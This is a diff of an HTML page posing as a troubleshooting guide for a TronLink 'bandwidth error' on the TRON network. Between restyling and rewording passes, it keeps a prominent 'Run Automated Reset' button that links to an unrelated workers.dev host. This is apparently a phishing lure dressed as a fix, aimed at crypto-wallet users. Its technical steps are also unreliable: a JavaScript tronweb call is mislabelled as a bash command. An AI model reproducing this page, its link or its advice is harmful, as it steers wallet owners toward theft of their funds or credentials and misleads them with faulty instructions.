@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tronlink Bandwidth Error</title>
 <style>
     body {
-        font-family: BlinkMacSystemFont;
-        background: #0a0c10;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff9455; }
     .btn {
         background: #ff7b2c;
         color: #000;
@@ -41,32 +41,28 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network, resulting in failed or pending transactions.</li>
+<li>Users encounter a "TronLink bandwidth error" when attempting to perform transactions or interact with smart contracts on the TRON network using TronLink, a popular wallet and browser extension.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to insufficient bandwidth or energy on the user's TRON account, which is required to process transactions and interact with the network.</li>
+<li>The error occurs due to insufficient bandwidth, which is a resource required for transactions on the TRON network. Bandwidth is typically replenished over time but can be depleted quickly with frequent transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Increase the account's bandwidth by freezing TRX tokens for a specified period.</li>
-<li>Adjust the transaction parameters to optimize energy consumption.</li>
-<li>Use the following JSON-RPC command to check the account's bandwidth and energy:</li>
+<li>Increase bandwidth by freezing TRX tokens, which can be done through the TronLink interface or via command line:</li>
+<li>Freeze a minimum of 1000 TRX to obtain a significant amount of bandwidth</li>
+<li>Use the <code>freeze</code> command in the TRON console to manually manage bandwidth</li>
+<li>Utilize the following bash command to freeze TRX and obtain bandwidth:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tron_getAccount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your_tron_account_address&quot;</span><span class="p">}],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>tronweb.trx.freezeBalance<span class="o">(</span><span class="m">1000</span>,<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="s2">&quot;your_tron_address&quot;</span><span class="o">)</span>
 </code></pre></div>
 
-<p>Consider utilizing an external console for enhanced debugging capabilities.</p>
+<p>Consider utilizing an external console for more advanced transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A TRON account with a sufficient balance of TRX tokens.</li>
-<li>The TronLink browser extension or a compatible wallet.</li>
-<li>A basic understanding of TRON's bandwidth and energy mechanisms.</li>
+<li>TronLink wallet installed and set up</li>
+<li>A basic understanding of TRON network resources (TRX, bandwidth, and energy)</li>
+<li>Sufficient TRX funds to freeze for bandwidth allocation</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
